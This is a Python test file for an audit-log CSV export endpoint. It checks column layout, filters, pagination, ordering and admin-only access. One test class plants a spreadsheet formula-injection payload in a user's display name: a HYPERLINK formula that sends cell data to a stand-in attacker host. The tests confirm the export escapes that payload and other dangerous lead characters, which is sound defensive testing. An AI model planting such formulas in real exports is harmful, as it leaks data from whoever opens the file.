"""Streaming CSV export of the audit log.

The deck puts "Export CSV" in the header, and the only useful meaning of that
button is "the rows I am looking at" — an export that ignores the filters
hands back a table nobody asked for, and one that exports a single page hands
back 50 rows out of 2,431. So it honours the current filters and walks every
page, streamed so a large answer never has to be assembled in memory first.
"""

from __future__ import annotations

import csv
import io
import uuid
from datetime import UTC, datetime

import httpx
from audit_log.constants import ACTION_CREATED, ACTION_DELETED, ACTION_UPDATED
from audit_log.models import AuditEntry
from simple_module_test import forge_session_cookie
from users.models import User

EXPORT_URL = "/api/audit_log/export.csv"
_ENTITY_TYPE = "Widget"
_ROWS = 120


async def _rows(client: httpx.AsyncClient, **params: str) -> list[dict[str, str]]:
    resp = await client.get(EXPORT_URL, params=params)
    assert resp.status_code == 200, resp.text
    assert resp.headers["content-type"].startswith("text/csv")
    return list(csv.DictReader(io.StringIO(resp.text)))


async def _seed_many(app) -> None:
    async with app.state.sm.db.session_factory() as session:
        for n in range(_ROWS):
            session.add(
                AuditEntry(
                    entity_type=_ENTITY_TYPE,
                    entity_id=f"w{n:03d}",
                    action=ACTION_UPDATED if n % 2 else ACTION_CREATED,
                    changes=[],
                )
            )
        await session.commit()


class TestExportShape:
    async def test_header_names_every_column(self, authenticated_client: httpx.AsyncClient) -> None:
        resp = await authenticated_client.get(EXPORT_URL)

        assert resp.status_code == 200, resp.text
        header = resp.text.splitlines()[0]
        assert header == "time,action,entity_type,entity_id,entity_label,actor,changes"

    async def test_response_is_offered_as_a_download(
        self, authenticated_client: httpx.AsyncClient
    ) -> None:
        resp = await authenticated_client.get(EXPORT_URL)

        assert "attachment" in resp.headers["content-disposition"]
        assert "audit-log" in resp.headers["content-disposition"]

    async def test_changes_are_flattened_one_field_per_clause(
        self, app, authenticated_client: httpx.AsyncClient
    ) -> None:
        """The same reading as the screen: `field: old → new`, `null` and the
        empty string kept apart."""
        async with app.state.sm.db.session_factory() as session:
            session.add(
                AuditEntry(
                    entity_type=_ENTITY_TYPE,
                    entity_id="flat",
                    action=ACTION_UPDATED,
                    changes=[
                        {"field": "is_active", "old": True, "new": False},
                        {"field": "disabled_at", "old": None, "new": "2026-08-19"},
                        {"field": "value", "old": "", "new": "mail.example.com"},
                    ],
                )
            )
            await session.commit()

        rows = await _rows(authenticated_client, entity_id="flat")

        assert rows[0]["changes"] == (
            "is_active: true → false; "
            'disabled_at: null → "2026-08-19"; '
            'value: "" → "mail.example.com"'
        )

    async def test_a_delete_exports_an_empty_changes_cell(
        self, app, authenticated_client: httpx.AsyncClient
    ) -> None:
        async with app.state.sm.db.session_factory() as session:
            session.add(
                AuditEntry(
                    entity_type=_ENTITY_TYPE,
                    entity_id="gone",
                    action=ACTION_DELETED,
                    changes=[],
                )
            )
            await session.commit()

        assert (await _rows(authenticated_client, entity_id="gone"))[0]["changes"] == ""


class TestExportContent:
    async def test_the_actor_and_entity_are_exported_by_name(
        self, app, authenticated_client: httpx.AsyncClient
    ) -> None:
        async with app.state.sm.db.session_factory() as session:
            actor = User(
                email="dana@example.com",
                hashed_password="x",
                full_name="Dana Rivera",
                is_active=True,
            )
            subject = User(
                email="sam@example.com",
                hashed_password="x",
                full_name="Sam Okafor",
                is_active=True,
            )
            session.add_all([actor, subject])
            await session.commit()
            actor_id, subject_id = str(actor.id), str(subject.id)

        async with app.state.sm.db.session_factory() as session:
            session.add(
                AuditEntry(
                    entity_type="User",
                    entity_id=subject_id,
                    action=ACTION_UPDATED,
                    changes=[],
                    user_id=actor_id,
                )
            )
            await session.commit()

        rows = await _rows(authenticated_client, entity_id=subject_id)

        assert rows[0]["entity_label"] == "Sam Okafor"
        assert rows[0]["actor"] == "Dana Rivera"
        assert rows[0]["entity_type"] == "User"
        assert rows[0]["entity_id"] == subject_id

    async def test_a_system_row_exports_a_blank_actor(
        self, app, authenticated_client: httpx.AsyncClient
    ) -> None:
        async with app.state.sm.db.session_factory() as session:
            session.add(
                AuditEntry(
                    entity_type=_ENTITY_TYPE,
                    entity_id="nobody",
                    action=ACTION_UPDATED,
                    changes=[],
                )
            )
            await session.commit()

        assert (await _rows(authenticated_client, entity_id="nobody"))[0]["actor"] == ""


class TestExportScope:
    async def test_every_page_is_exported_not_just_the_first(
        self, app, authenticated_client: httpx.AsyncClient
    ) -> None:
        await _seed_many(app)

        rows = await _rows(authenticated_client, entity_type=_ENTITY_TYPE)

        assert len(rows) == _ROWS

    async def test_the_page_cursor_does_not_narrow_the_export(
        self, app, authenticated_client: httpx.AsyncClient
    ) -> None:
        """The header button carries the screen's query string, page and all."""
        await _seed_many(app)

        rows = await _rows(authenticated_client, entity_type=_ENTITY_TYPE, page="2", page_size="10")

        assert len(rows) == _ROWS

    async def test_the_current_filters_are_honoured(
        self, app, authenticated_client: httpx.AsyncClient
    ) -> None:
        await _seed_many(app)

        rows = await _rows(authenticated_client, entity_type=_ENTITY_TYPE, action=ACTION_CREATED)

        assert len(rows) == _ROWS // 2
        assert {r["action"] for r in rows} == {ACTION_CREATED}

    async def test_the_actor_filter_accepts_a_name_here_too(
        self, app, authenticated_client: httpx.AsyncClient
    ) -> None:
        """The button hands the endpoint whatever is in the Actor box."""
        async with app.state.sm.db.session_factory() as session:
            user = User(
                email="pat@example.com",
                hashed_password="x",
                full_name="Pat Nkemdirim",
                is_active=True,
            )
            session.add(user)
            await session.commit()
            user_id = str(user.id)

        async with app.state.sm.db.session_factory() as session:
            session.add(
                AuditEntry(
                    entity_type=_ENTITY_TYPE,
                    entity_id="by-pat",
                    action=ACTION_UPDATED,
                    changes=[],
                    user_id=user_id,
                )
            )
            session.add(
                AuditEntry(
                    entity_type=_ENTITY_TYPE,
                    entity_id="by-nobody",
                    action=ACTION_UPDATED,
                    changes=[],
                )
            )
            await session.commit()

        rows = await _rows(authenticated_client, entity_type=_ENTITY_TYPE, user_id="nkemdirim")

        assert [r["entity_id"] for r in rows] == ["by-pat"]

    async def test_rows_are_ordered_newest_first_like_the_screen(
        self, app, authenticated_client: httpx.AsyncClient
    ) -> None:
        async with app.state.sm.db.session_factory() as session:
            for n, day in enumerate((17, 18, 19)):
                session.add(
                    AuditEntry(
                        entity_type=_ENTITY_TYPE,
                        entity_id=f"d{n}",
                        action=ACTION_UPDATED,
                        changes=[],
                        created_at=datetime(2026, 8, day, 12, 0, tzinfo=UTC),
                    )
                )
            await session.commit()

        rows = await _rows(authenticated_client, entity_type=_ENTITY_TYPE)

        assert [r["entity_id"] for r in rows] == ["d2", "d1", "d0"]


class TestExportPermission:
    async def test_anonymous_callers_are_turned_away(self, client: httpx.AsyncClient) -> None:
        resp = await client.get(EXPORT_URL, follow_redirects=False)

        assert resp.status_code in (302, 303, 401, 403)

    async def test_a_signed_in_non_admin_is_refused(self, app) -> None:
        """Signed in is not the same as allowed to read the audit trail. The
        export is a second door onto the same rows as the browse screen, and a
        guard on one of the two doors is not a guard."""
        from users.bootstrap import create_standard_user

        async with app.state.sm.db.session_factory() as session:
            result = await create_standard_user(
                session,
                email="nosy@example.com",
                password="UserPass1!",
                full_name="Nosy Parker",
            )
            user_id = str(result.user.id)

        cookie = forge_session_cookie(str(app.state.sm.settings.secret_key), {"user_id": user_id})
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app),
            base_url="http://testserver",
            cookies={"session": cookie},
        ) as viewer:
            resp = await viewer.get(EXPORT_URL, follow_redirects=False)

        assert resp.status_code == 403, resp.text

    async def test_an_unknown_entity_id_exports_only_the_header(
        self, authenticated_client: httpx.AsyncClient
    ) -> None:
        assert await _rows(authenticated_client, entity_id=str(uuid.uuid4())) == []


class TestFormulaInjection:
    """A spreadsheet evaluates a cell that starts with ``=``.

    ``entity_label`` and ``actor`` are user-controlled — a display name is
    whatever someone typed into it — so an export opened in Excel or Sheets
    would run whatever the attacker put in their profile. Everything else on
    the row is machine-generated, but the escape is applied per cell rather
    than per column so a future column cannot quietly reopen the hole.
    """

    async def test_a_formula_display_name_is_neutralised(
        self, app, authenticated_client: httpx.AsyncClient
    ) -> None:
        payload = '=HYPERLINK("http://evil.example/?"&A1,"Click me")'
        async with app.state.sm.db.session_factory() as session:
            user = User(
                email="formula@example.com",
                hashed_password="x",
                full_name=payload,
                is_active=True,
            )
            session.add(user)
            await session.commit()
            user_id = str(user.id)

        async with app.state.sm.db.session_factory() as session:
            session.add(
                AuditEntry(
                    entity_type=_ENTITY_TYPE,
                    entity_id="injected",
                    action=ACTION_UPDATED,
                    changes=[],
                    user_id=user_id,
                )
            )
            await session.commit()

        rows = await _rows(authenticated_client, entity_type=_ENTITY_TYPE)
        row = next(r for r in rows if r["entity_id"] == "injected")

        assert row["actor"] == f"'{payload}"

    def test_every_dangerous_lead_character_is_prefixed(self) -> None:
        from audit_log.export import escape_formula

        for lead in ("=", "+", "-", "@", "\t", "\r"):
            assert escape_formula(f"{lead}cmd") == f"'{lead}cmd"

    def test_ordinary_text_is_untouched(self) -> None:
        from audit_log.export import escape_formula

        assert escape_formula("Dana Rivera") == "Dana Rivera"
        assert escape_formula("") == ""
        assert escape_formula("2026-09-03T10:00:00+00:00") == "2026-09-03T10:00:00+00:00"
